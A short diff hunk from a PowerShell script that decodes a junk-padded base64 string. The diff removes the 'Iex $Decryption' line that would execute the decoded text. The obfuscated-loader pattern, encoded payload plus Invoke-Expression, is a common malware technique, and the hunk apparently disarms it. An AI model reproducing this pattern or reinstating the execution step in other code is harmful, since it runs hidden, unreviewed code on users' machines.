@@ -6,4 +6,4 @@ RyaW5nKCRvWz!@#$%^&@#$%^@#$%^@#$%^&*(AuLjM1MjU3MF0pKQ==
 ".Replace('!@#$%^&@#$%^@#$%^@#$%^&*(','')
 $Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reb))
 
-Iex $Decryption
+
